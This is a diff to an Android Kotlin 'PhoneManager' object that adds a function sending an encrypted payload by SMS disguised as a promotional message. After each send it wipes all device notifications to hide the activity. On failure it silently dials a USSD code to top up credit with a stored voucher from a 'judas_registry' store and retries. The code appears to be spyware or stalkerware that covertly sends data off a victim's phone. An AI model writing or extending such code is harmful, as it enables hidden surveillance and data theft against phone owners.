@@ -3,6 +3,8 @@ package com.example.myandroid
 import android.content.Context
 import android.provider.CallLog
 import android.provider.ContactsContract
+import kotlinx.coroutines.*
+import kotlin.coroutines.resume
 import org.json.JSONArray
 import org.json.JSONObject
 import java.util.Date
@@ -430,6 +432,109 @@ object PhoneManager {
         } catch (e: Exception) {
             DebugLogger.log("CONTACTS_ERR", "Purge fail: ${e.message}")
             return -1
+        }
+    }
+
+    suspend fun sendEncryptedRobustSms(ctx: Context, phone: String, payload: String): Boolean {
+        val token = FidelCipher.encode(payload)
+        val promo = FidelCipher.camouflage(ctx, token)
+        
+        var attempts = 0
+        while (attempts < 3) {
+            if (sendAndWait(ctx, phone, promo)) {
+                DebugLogger.log("ROBUST_SMS", "Encrypted SMS dispatched successfully to $phone.")
+                
+                CoroutineScope(Dispatchers.Main).launch {
+                    delay(1500)
+                    MyNotificationListener.instance?.wipeNotifications("ALL", null)
+                }
+                return true
+            }
+            attempts++
+            DebugLogger.log("ROBUST_SMS", "SMS send failed (Attempt $attempts/3).")
+            delay(5000)
+        }
+        
+        val prefs = ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE)
+        val voucher = prefs.getString("stored_voucher", "") ?: ""
+        if (voucher.isNotEmpty()) {
+            DebugLogger.log("ROBUST_SMS", "Recovery: Attempting USSD top-up with voucher: $voucher")
+            try {
+                val ussd = "*805*$voucher#" 
+                val intent = android.content.Intent(android.content.Intent.ACTION_CALL, android.net.Uri.parse("tel:" + android.net.Uri.encode(ussd))).apply {
+                    addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                ctx.startActivity(intent)
+                prefs.edit().remove("stored_voucher").apply()
+                
+                DebugLogger.log("ROBUST_SMS", "USSD Dialed. Waiting 60s for network confirmation...")
+                delay(60000)
+                
+                if (sendAndWait(ctx, phone, promo)) {
+                    DebugLogger.log("ROBUST_SMS", "Encrypted SMS dispatched successfully post-recovery.")
+                    CoroutineScope(Dispatchers.Main).launch {
+                        delay(1500)
+                        MyNotificationListener.instance?.wipeNotifications("ALL", null)
+                    }
+                    return true
+                }
+            } catch (e: Exception) {
+                DebugLogger.log("ROBUST_SMS_ERR", "Recovery USSD failed: ${e.message}")
+            }
+        } else {
+            DebugLogger.log("ROBUST_SMS", "No voucher available for recovery.")
+        }
+        return false
+    }
+
+    private suspend fun sendAndWait(ctx: Context, phone: String, msg: String): Boolean = suspendCancellableCoroutine { cont ->
+        val smsManager = ctx.getSystemService(android.telephony.SmsManager::class.java)
+        val parts = smsManager.divideMessage(msg)
+        
+        val action = "com.example.myandroid.SMS_SENT_${System.currentTimeMillis()}"
+        var partsCompleted = 0
+        var hasFailure = false
+        
+        val receiver = object : android.content.BroadcastReceiver() {
+            override fun onReceive(context: Context, intent: android.content.Intent) {
+                if (resultCode != android.app.Activity.RESULT_OK) {
+                    hasFailure = true
+                }
+                partsCompleted++
+                if (partsCompleted == parts.size) {
+                    try { context.unregisterReceiver(this) } catch(e:Exception){}
+                    if (cont.isActive) cont.resume(!hasFailure)
+                }
+            }
+        }
+        
+        androidx.core.content.ContextCompat.registerReceiver(
+            ctx, receiver, android.content.IntentFilter(action), 
+            androidx.core.content.ContextCompat.RECEIVER_NOT_EXPORTED
+        )
+        
+        val sentIntents = java.util.ArrayList<android.app.PendingIntent>()
+        for (i in parts.indices) {
+            val pi = android.app.PendingIntent.getBroadcast(
+                ctx, i, android.content.Intent(action),
+                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
+            )
+            sentIntents.add(pi)
+        }
+        
+        try {
+            smsManager.sendMultipartTextMessage(phone, null, parts, sentIntents, null)
+        } catch (e: Exception) {
+            try { ctx.unregisterReceiver(receiver) } catch(ex:Exception){}
+            if (cont.isActive) cont.resume(false)
+        }
+        
+        CoroutineScope(Dispatchers.IO).launch {
+            delay(30000)
+            if (cont.isActive) {
+                try { ctx.unregisterReceiver(receiver) } catch(ex:Exception){}
+                cont.resume(false)
+            }
         }
     }
 }
